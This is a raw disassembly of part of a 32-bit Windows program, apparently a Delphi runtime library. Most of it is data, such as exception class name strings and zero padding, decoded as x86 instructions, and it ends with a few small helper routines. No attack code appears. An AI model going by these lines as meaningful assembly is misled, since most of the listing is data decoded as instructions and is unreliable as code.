add [ eax ] cl
jpe r-xdata
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x40 ] ch
dec edi
dec bp
insd
outsd
jb r-xdata
adc al 0x7b
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6004036 ] dh
inc ebp
inc ecx
bound ebp [ edi + 0x72 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 ] ah
jb r-xdata
add [ eax ] al
insb
jpo r-xdata
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jpo r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xb004036 ] dh
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x7b
imul ebp [ edi + 0x6e ] 0x407ab890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000407a ] bh
add [ eax ] al
add [ eax ] dl
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
push cs
pop esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] bh
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x7c
popad
insb
mov eax eax
les edi [ ebx + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ ebx + 0x40 ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] dl
add [ ecx + eax * 8 ] ch
inc eax
add [ eax + 0xc004036 ] dh
inc ebp
dec edi
jne r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ ecx + eax * 8 ] ch
inc eax
add [ eax + 0xe004036 ] dh
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
jl r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xa004036 ] dh
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
aam 0x7c
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x36 ] bl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al bl
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x7c
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 2 + 0x100040 ] ch
add [ eax ] al
fdivr [ ebx + 0x40 ]
add [ eax ] cl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x12004036 ] dh
inc ebp
inc ebp
js r-xdata
inc eax
sar [ esp + edi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + 0x40 ] bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax + 0xb004036 ] dh
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add al bl
jpo r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jle r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x7e906564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jle r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi * 2 + 0x39080040 ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xa004036 ] dh
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jge r-xdata
add [ eax + 0xa004036 ] dh
inc ebp
dec ebp
popad
je r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
imul ebp [ edi + 0x6e ] 0x407c2490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7f ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ edi * 2 + 0x39080040 ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xa004036 ] dh
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jg r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000407e ] dl
add [ eax ] al
add [ edi * 2 + 0x39080040 ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
add [ eax ] dl
add [ eax ] al
je r-xdata
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x407e3890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xb004036 ] dh
inc ebp
pop edx
jb r-xdata
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x36 ] bl
inc eax
add [ eax ] al
add [ eax ] ah
jpo r-xdata
inc eax
add [ eax + 0x407d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000407d ] cl
add [ esi + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 + 0xc0040 ] bl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jg r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] dl
jpe r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
mov [ ebp + 0x40 ] bh
add [ eax ] dl
add [ eax + 0xc004036 ] dh
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ edi * 2 + 0x39080040 ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jg r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
jns r-xdata
add [ eax + eax ] cl
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
inc ebp
dec edi
jbe r-xdata
inc eax
jg r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
shr al 0x7e
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 + 0x40 ] dl
add [ eax ] dl
jg r-xdata
lea eax [ eax ]
clc
jb r-xdata
jg r-xdata
add [ ecx + eax * 8 ] ch
inc eax
add [ eax + 0xf004036 ] dh
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x10004036 ] dh
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
jb r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0xd004036 ] dh
inc ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x40 ] dh
add [ eax + 0xc004036 ] dh
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
mov ah 0x80
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 4 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
inc eax
add [ eax ] al
add [ eax ] ah
jpo r-xdata
rcl [ eax + eax * 4 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add [ eax ] 0x10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] 0xc
push esp
jns r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004081
insb
nop
or al 0x81
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7f ] ch
inc eax
add [ eax ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 + 0x100040 ] dh
add [ eax ] al
and [ ebx + 0x40 ] bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] bl
outsd
insb
inc ebx
mov eax eax
rol [ ecx + 0x40 ] 0x0
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x80
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jpo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 + 0x40 ] bh
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ edx + eax * 4 + 0x40 ] bh
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add [ eax ] 0xc
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0x10004036 ] dh
inc ebp
inc ecx
add [ eax + 0x36 ] bl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ecx + 0xc0040 ] 0x0
add [ ecx + edi * 2 + 0x40 ] dl
insb
outsd
ja r-xdata
add [ eax ] al
inc ebx
popad
jae r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ edx + 0xc0040 ]
add [ eax ] al
push esp
jns r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
je r-xdata
push 0x4081
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + 0xc0040 ] es
inc ebp
jb r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
mov al 0x36
inc eax
add [ esi ] cl
xor al 0x83
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 ] dh
inc eax
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] dl
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x8004036 ] dh
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
jb r-xdata
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] ch
jns r-xdata
outsd
jb r-xdata
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xd004036 ] dh
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
inc eax
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x82
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
rcr [ edx + eax * 4 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
and [ ebx + 0x40 ] bh
add [ eax + 0xa004036 ] dh
inc ebp
push eax
jb r-xdata
inc eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
push ebp
add [ esi + esi + 0x40 ] dh
add [ eax + 0x130040d4 ] bl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0xc0040 ] cl
jae r-xdata
adc [ ebp + 0x41 ] al
fadd [ edx + 0x40 ]
add [ eax ] al
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
dec ecx
outsb
je r-xdata
add [ eax + 0x36 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + eax * 4 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 + 0x2c0040 ] dl
je r-xdata
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
inc eax
test [ eax ] al
push eax
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
imul ebp [ edi + 0x6e ] 0x4083a490
add [ ecx ] dl
add ebp [ esi ]
xor esi [ esp + eax ]
add [ eax ] al
add [ eax + edx + r-xdata ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
pop es
cmp eax [ eax ]
add al ch
idiv [ eax + 0x5e5fffff ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x85
inc eax
add [ eax + 0x4084 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 4 + 0x300040 ] bl
add [ eax ] al
enter 0x4011 0x0
or [ ecx ] bh
inc eax
add [ eax ] dl
bound eax [ eax ]
sbb al 0x62
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
sub al 0x62
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x29 ] bl
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
test [ eax ] al
sub al 0x0
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror al 0x83
inc eax
add [ ecx ] dl
add ebp [ esi ]
xor al 0x34
add al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] ch
jns r-xdata
inc eax
add [ eax ] bl
add [ eax - 0x7c ] al
inc eax
add [ eax ] dl
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
je r-xdata
pop ebx
retn
call sub_40c098
call sub_403e8c
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
cmp [ eax ] eax
adc al 0x39
add eax 0xffffffd4
jmp sub_40d988
int3
push ebp
je r-xdata
insb
jne r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
mov eax ebx
call sub_402744
mov esi eax
mov eax esi
xor ecx ecx
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x12004036 ] dh
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
mov edx ebx
call sub_402fc4
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_408544
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_408578
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
pop edi
pop esi
pop ebx
retn
sub_40859c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_402744
mov esi eax
mov eax esi
xor ecx ecx
